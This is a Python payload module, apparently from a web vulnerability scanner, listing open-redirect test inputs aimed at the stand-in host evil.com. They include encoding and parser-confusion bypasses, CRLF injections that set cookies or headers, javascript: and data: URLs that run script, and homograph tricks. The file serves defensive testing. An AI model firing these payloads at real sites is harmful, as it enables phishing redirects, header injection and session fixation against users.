"""
scanner/payloads/redirect.py

Open Redirect payloads for vulnerability testing.
Tests for unvalidated redirects that could be used for phishing.

Categories covered:
1. Protocol-relative URL variations
2. Encoding bypass variations (URL, double, Unicode)
3. Parser confusion payloads
4. Whitespace bypass
5. Case variation bypasses
6. CRLF in redirect
7. JavaScript URL variations
8. Data URL redirects
9. Fragment-based redirects
10. Path traversal in redirects
"""

from .base import Payload


def redirect_confirm(response_text: str) -> bool:
    """
    Check for open redirect indicators.
    This is mainly detected by checking response headers/redirects.
    """
    # Check if external domain appears in response
    indicators = [
        "evil.com",
        "attacker.com",
        "example.com",
        "//evil",
        "http://evil",
        "https://evil",
        "evil%2ecom",
        "evil%2Ecom",
    ]

    text_lower = response_text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


REDIRECT_PAYLOADS = [
    # ============================================
    # CATEGORY 1: PROTOCOL-RELATIVE URL VARIATIONS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="External URL HTTPS",
        payload="https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="External URL HTTP",
        payload="http://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Protocol-relative double slash",
        payload="//evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Protocol-relative with path",
        payload="//evil.com/path",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Protocol-relative triple slash",
        payload="///evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Protocol-relative backslash forward",
        payload="\\/evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Protocol-relative forward backslash",
        payload="/\\evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 2: ENCODING BYPASS VARIATIONS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="URL encoded full",
        payload="https%3A%2F%2Fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Double URL encoded",
        payload="https%253A%252F%252Fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Triple URL encoded",
        payload="https%25253A%25252F%25252Fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="URL encoded slashes only",
        payload="https:%2F%2Fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="URL encoded protocol-relative",
        payload="%2F%2Fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Double encoded protocol-relative",
        payload="%252F%252Fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Unicode encoded slashes",
        payload="https:\u002f\u002fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Unicode fullwidth slashes",
        payload="https:\uff0f\uff0fevil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Mixed encoding",
        payload="https:%2f/evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Encoded dot in domain",
        payload="https://evil%2ecom",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 3: PARSER CONFUSION PAYLOADS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="At sign bypass",
        payload="https://legit.com@evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="At sign with credentials",
        payload="https://user:pass@evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Backslash bypass",
        payload="\\\\evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Backslash in path",
        payload="https://legit.com\\@evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Question mark confusion",
        payload="//evil.com?legit.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Hash fragment confusion",
        payload="//evil.com#legit.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Subdomain confusion",
        payload="https://legit.com.evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Port confusion",
        payload="https://evil.com:80@legit.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Null byte injection",
        payload="https://evil.com%00.legit.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Tab character confusion",
        payload="https://evil.com%09.legit.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 4: WHITESPACE BYPASS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="Leading space",
        payload=" https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Leading tab",
        payload="\thttps://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Leading newline",
        payload="\nhttps://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Leading carriage return",
        payload="\rhttps://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Encoded space bypass",
        payload="%20https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Whitespace in protocol",
        payload="https ://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Vertical tab bypass",
        payload="\x0bhttps://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Form feed bypass",
        payload="\x0chttps://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 5: CASE VARIATION BYPASSES
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="Mixed case HTTP",
        payload="HtTpS://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Uppercase protocol",
        payload="HTTPS://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Mixed case domain",
        payload="https://EVIL.COM",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Alternating case",
        payload="hTtPs://EvIl.CoM",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 6: CRLF IN REDIRECT
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="CRLF injection basic",
        payload="https://evil.com%0d%0aX-Injected: header",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="CRLF with Location header",
        payload="%0d%0aLocation: https://evil.com",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="CRLF double encoded",
        payload="https://evil.com%250d%250aX-Injected: header",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="CRLF with Set-Cookie",
        payload="%0d%0aSet-Cookie: session=evil%0d%0aLocation: https://evil.com",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Unicode CRLF",
        payload="https://evil.com\u000d\u000aX-Header: injected",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 7: JAVASCRIPT URL VARIATIONS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript protocol basic",
        payload="javascript:location='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript with document.location",
        payload="javascript:document.location='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript window.location",
        payload="javascript:window.location='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript location.href",
        payload="javascript:location.href='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript location.replace",
        payload="javascript:location.replace('https://evil.com')",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript location.assign",
        payload="javascript:location.assign('https://evil.com')",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript mixed case",
        payload="jAvAsCrIpT:location='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript with whitespace",
        payload="java\tscript:location='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript URL encoded",
        payload="javascript:location='https%3A%2F%2Fevil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="JavaScript with newline",
        payload="javascript:\nlocation='https://evil.com'",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 8: DATA URL REDIRECTS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="Data URL with script redirect",
        payload="data:text/html,<script>location='https://evil.com'</script>",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Data URL with meta refresh",
        payload="data:text/html,<meta http-equiv='refresh' content='0;url=https://evil.com'>",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Data URL base64 encoded",
        payload="data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Data URL with window.open",
        payload="data:text/html,<script>window.open('https://evil.com')</script>",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Data URL mixed case",
        payload="DaTa:text/html,<script>location='https://evil.com'</script>",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 9: FRAGMENT-BASED REDIRECTS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="Fragment with external URL",
        payload="#https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Fragment redirect pattern",
        payload="#redirect=https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Fragment with next param",
        payload="#next=https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Fragment with return URL",
        payload="#returnUrl=https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Fragment with callback",
        payload="#callback=https://evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # CATEGORY 10: PATH TRAVERSAL IN REDIRECTS
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="Path traversal to external",
        payload="/../..//evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Dot segments bypass",
        payload="/./evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Double dot external",
        payload="/..//evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Encoded traversal",
        payload="/%2e%2e/%2e%2e/evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Path with protocol-relative",
        payload="/redirect/..//evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Multiple traversal external",
        payload="/../../..//evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),

    # ============================================
    # ADDITIONAL BYPASS TECHNIQUES
    # ============================================
    Payload(
        vuln_type="OpenRedirect",
        name="IPv4 decimal notation",
        payload="http://3232235777",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="IPv4 hex notation",
        payload="http://0xc0a80001",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="IPv4 octal notation",
        payload="http://0300.0250.0.01",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="URL with zero-width chars",
        payload="https://e\u200bvil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Punycode domain",
        payload="https://xn--vi-xka.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Right-to-left override",
        payload="https://moc.live\u202e.evil.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
    Payload(
        vuln_type="OpenRedirect",
        name="Homograph attack",
        payload="https://evil\u0430.com",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=redirect_confirm
    ),
]
